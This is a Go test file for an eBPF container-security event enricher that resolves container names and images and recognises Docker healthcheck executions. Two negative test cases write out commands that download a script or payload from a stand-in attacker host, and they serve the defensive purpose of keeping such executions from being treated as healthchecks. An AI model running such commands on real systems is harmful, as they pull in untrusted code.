//go:build linux

package ebpf

import (
	"context"
	"testing"
	"time"
)

func TestExtractJSONStringField(t *testing.T) {
	tests := []struct {
		name     string
		data     string
		key      string
		expected string
	}{
		{
			name:     "simple name field",
			data:     `{"Name":"/my-container","ID":"abc123"}`,
			key:      "Name",
			expected: "/my-container",
		},
		{
			name:     "name with hyphens and dots",
			data:     `{"Name":"/ak-wildcard-api.v2","ID":"abc"}`,
			key:      "Name",
			expected: "/ak-wildcard-api.v2",
		},
		{
			name:     "field not found",
			data:     `{"ID":"abc123"}`,
			key:      "Name",
			expected: "",
		},
		{
			name:     "empty value",
			data:     `{"Name":"","ID":"abc"}`,
			key:      "Name",
			expected: "",
		},
		{
			name:     "escaped quotes in value",
			data:     `{"Name":"/my-\"special\"-container","ID":"abc"}`,
			key:      "Name",
			expected: `/my-\"special\"-container`,
		},
		{
			name:     "realistic config.v2.json snippet",
			data:     `{"StreamConfig":{},"State":{"Running":true},"ID":"4059c0fd00c757416e8448633426b154be59261794a9031e0766f6527a0b9053","Created":"2025-01-15T10:00:00Z","Path":"/entrypoint.sh","Name":"/alertkick-web","Driver":"overlay2"}`,
			key:      "Name",
			expected: "/alertkick-web",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := extractJSONStringField([]byte(tc.data), tc.key)
			if result != tc.expected {
				t.Errorf("extractJSONStringField(%q) = %q, want %q", tc.key, result, tc.expected)
			}
		})
	}
}

func TestLookupDockerContainerName_TrimSlash(t *testing.T) {
	// Verify that the Name field from config.v2.json gets the leading "/" stripped
	name := "/alertkick-web"
	trimmed := name[1:] // simulate strings.TrimPrefix(name, "/")
	if trimmed != "alertkick-web" {
		t.Errorf("expected 'alertkick-web', got %q", trimmed)
	}
}

// withoutRuntimeCLIs disables the real runtime listers so tests exercise only
// the in-memory inventory, never a real `docker ps` on the test host.
func withoutRuntimeCLIs(e *EventEnricher) {
	e.dockerList = func(context.Context) map[string]string { return nil }
	e.podmanList = func(context.Context) map[string]string { return nil }
	e.crictlList = func(context.Context) map[string]string { return nil }
}

func TestRefreshInventory_ListsRunningContainers(t *testing.T) {
	e := NewEventEnricher()
	id := "deadbeef000000000000000000000000000000000000000000000000deadbeef"
	var dockerCalls int
	e.dockerList = func(context.Context) map[string]string {
		dockerCalls++
		return map[string]string{id: "alertkick-ui"}
	}
	e.podmanList = func(context.Context) map[string]string { return nil }
	e.crictlList = func(context.Context) map[string]string { return nil }

	e.RefreshInventory(context.Background())

	// Per-event resolution is now a pure lookup — no shell-out, and the short
	// 12-char ID resolves too.
	if got := e.resolveContainerName(id); got != "alertkick-ui" {
		t.Fatalf("resolveContainerName(full) = %q, want alertkick-ui", got)
	}
	if got := e.resolveContainerName(id[:12]); got != "alertkick-ui" {
		t.Fatalf("resolveContainerName(short) = %q, want alertkick-ui", got)
	}
	if dockerCalls != 1 {
		t.Fatalf("dockerList called %d times for many resolves, want 1", dockerCalls)
	}
}

func TestResolveContainerName_MissReadsFSOnceThenCaches(t *testing.T) {
	e := NewEventEnricher()
	withoutRuntimeCLIs(e)
	// Filesystem lookup misses in the test env, so the unknown container
	// resolves to "" — and that negative is remembered so repeated events for
	// the same id don't re-probe the filesystem.
	id := "abc123abc123abc123abc123abc123abc123abc123abc123abc123abc123abc1"
	if got := e.resolveContainerName(id); got != "" {
		t.Fatalf("expected empty name for unknown container, got %q", got)
	}
	if _, ok := e.lookupInventory(id); !ok {
		t.Fatalf("negative result not cached in inventory for %s", id)
	}
}

func TestRefreshInventory_MergesRuntimes(t *testing.T) {
	e := NewEventEnricher()
	dockerID := "d000000000000000000000000000000000000000000000000000000000000000"
	crictlID := "c000000000000000000000000000000000000000000000000000000000000000"
	e.dockerList = func(context.Context) map[string]string { return map[string]string{dockerID: "from-docker"} }
	e.podmanList = func(context.Context) map[string]string { return nil }
	e.crictlList = func(context.Context) map[string]string { return map[string]string{crictlID: "from-crictl"} }

	e.RefreshInventory(context.Background())

	if got := e.resolveContainerName(dockerID); got != "from-docker" {
		t.Errorf("docker name = %q, want from-docker", got)
	}
	if got := e.resolveContainerName(crictlID); got != "from-crictl" {
		t.Errorf("crictl name = %q, want from-crictl", got)
	}
}

func TestParsePSList(t *testing.T) {
	out := "abc123 alertkick-ui\n" +
		"def456 web,web-alias\n" +
		"  \n" + // blank line ignored
		"ghi789" // no name column ignored
	m := parsePSList(out)
	if m["abc123"] != "alertkick-ui" {
		t.Errorf("abc123 = %q, want alertkick-ui", m["abc123"])
	}
	if m["def456"] != "web" {
		t.Errorf("def456 = %q, want web (first of comma list)", m["def456"])
	}
	if _, ok := m["ghi789"]; ok {
		t.Errorf("ghi789 should be skipped (no name column)")
	}
}

func TestMatchesHealthcheckCmd(t *testing.T) {
	shellTest := []string{"CMD-SHELL", "wget --no-verbose --tries=1 --spider http://localhost:3000/health || exit 1"}
	cases := []struct {
		name    string
		cmdline string
		test    []string
		want    bool
	}{
		{"shell wrapper", "/bin/sh -c wget --no-verbose --tries=1 --spider http://localhost:3000/health || exit 1", shellTest, true},
		{"shell child exact", "wget --no-verbose --tries=1 --spider http://localhost:3000/health", shellTest, true},
		{"shell child full path", "/usr/bin/wget --no-verbose --tries=1 --spider http://localhost:3000/health", shellTest, true},
		{"bare binary does not ride along", "wget", shellTest, false},
		{"different args no match", "wget -q -O- http://evil.example/x.sh", shellTest, false},
		{"second command of && chain", "curl -f http://127.0.0.1:8080/ready",
			[]string{"CMD-SHELL", "test -f /tmp/up && curl -f http://127.0.0.1:8080/ready"}, true},
		{"quoted url in config", "curl -fsS http://localhost:9090/-/healthy",
			[]string{"CMD-SHELL", `curl -fsS "http://localhost:9090/-/healthy"`}, true},
		{"CMD direct", "curl -f http://localhost/", []string{"CMD", "curl", "-f", "http://localhost/"}, true},
		{"CMD path normalized", "/usr/bin/curl -f http://localhost/", []string{"CMD", "curl", "-f", "http://localhost/"}, true},
		{"CMD mismatch", "curl -f http://localhost/admin", []string{"CMD", "curl", "-f", "http://localhost/"}, false},
		{"NONE directive", "wget http://localhost/", []string{"NONE"}, false},
		{"no healthcheck", "wget http://localhost/", nil, false},
		{"empty cmdline", "", shellTest, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := MatchesHealthcheckCmd(tc.cmdline, tc.test); got != tc.want {
				t.Fatalf("MatchesHealthcheckCmd(%q, %v) = %v, want %v", tc.cmdline, tc.test, got, tc.want)
			}
		})
	}
}

func TestGetHealthcheckTest_CachesAndPrunes(t *testing.T) {
	e := NewEventEnricher()
	id := "beef00000000000000000000000000000000000000000000000000000000beef"
	var reads int
	e.healthcheckRead = func(string) []string {
		reads++
		return []string{"CMD-SHELL", "curl -f http://localhost/"}
	}

	e.getHealthcheckTest(id)
	e.getHealthcheckTest(id)
	if reads != 1 {
		t.Fatalf("healthcheckRead called %d times, want 1 (cached)", reads)
	}

	// A refresh that no longer lists the container evicts its entry…
	e.dockerList = func(context.Context) map[string]string { return nil }
	e.podmanList = func(context.Context) map[string]string { return nil }
	e.crictlList = func(context.Context) map[string]string { return nil }
	e.RefreshInventory(context.Background())
	e.getHealthcheckTest(id)
	if reads != 2 {
		t.Fatalf("healthcheckRead called %d times after eviction, want 2", reads)
	}

	// …while a refresh that still lists it keeps the cache warm.
	e.dockerList = func(context.Context) map[string]string { return map[string]string{id: "svc"} }
	e.RefreshInventory(context.Background())
	e.getHealthcheckTest(id)
	if reads != 2 {
		t.Fatalf("healthcheckRead called %d times, want 2 (still inventoried)", reads)
	}
}

func TestEnrich_StampsHealthcheckExec(t *testing.T) {
	e := NewEventEnricher()
	id := "cafe00000000000000000000000000000000000000000000000000000000cafe"
	e.healthcheckRead = func(gotID string) []string {
		if gotID != id {
			t.Fatalf("healthcheckRead got id %q, want %q", gotID, id)
		}
		return []string{"CMD-SHELL", "wget -q --spider http://localhost:80/ || exit 1"}
	}
	// Seed the PID->container cache so Enrich resolves without /proc.
	pid := 4242
	e.containerCache[pid] = &ContainerCacheEntry{ContainerID: id, ContainerName: "web", Runtime: "docker"}
	e.containerCacheTime[pid] = time.Now()

	mkEvent := func(cmdline string) SecurityEvent {
		return SecurityEvent{
			Category: "process",
			Rule:     "Process Execution",
			Process:  ProcessInfo{PID: pid, Name: "sh", Cmdline: cmdline},
		}
	}

	ev := mkEvent("/bin/sh -c wget -q --spider http://localhost:80/ || exit 1")
	e.Enrich(&ev)
	if !ev.Process.IsHealthcheck {
		t.Fatalf("wrapper exec not stamped as healthcheck")
	}

	child := mkEvent("wget -q --spider http://localhost:80/")
	e.Enrich(&child)
	if !child.Process.IsHealthcheck {
		t.Fatalf("child exec not stamped as healthcheck")
	}

	other := mkEvent("wget -q -O- http://203.0.113.9/payload")
	e.Enrich(&other)
	if other.Process.IsHealthcheck {
		t.Fatalf("unrelated exec wrongly stamped as healthcheck")
	}
}

func TestGetContainerImage_CachesAndPrunes(t *testing.T) {
	e := NewEventEnricher()
	id := "feed00000000000000000000000000000000000000000000000000000000feed"
	var reads int
	e.imageRead = func(string) string {
		reads++
		return "ghcr.io/alertkick/api:v4"
	}

	if got := e.getContainerImage(id); got != "ghcr.io/alertkick/api:v4" {
		t.Fatalf("getContainerImage = %q, want image ref", got)
	}
	e.getContainerImage(id)
	if reads != 1 {
		t.Fatalf("imageRead called %d times, want 1 (cached)", reads)
	}

	// Negative results are cached too — an unreadable container shouldn't
	// trigger a file read per event.
	missID := "dead00000000000000000000000000000000000000000000000000000000dead"
	e.imageRead = func(string) string { reads++; return "" }
	e.getContainerImage(missID)
	e.getContainerImage(missID)
	if reads != 2 {
		t.Fatalf("imageRead called %d times, want 2 (negative cached)", reads)
	}

	// A refresh that no longer lists the container evicts its entry.
	e.dockerList = func(context.Context) map[string]string { return nil }
	e.podmanList = func(context.Context) map[string]string { return nil }
	e.crictlList = func(context.Context) map[string]string { return nil }
	e.RefreshInventory(context.Background())
	e.getContainerImage(id)
	if reads != 3 {
		t.Fatalf("imageRead called %d times after eviction, want 3", reads)
	}
}
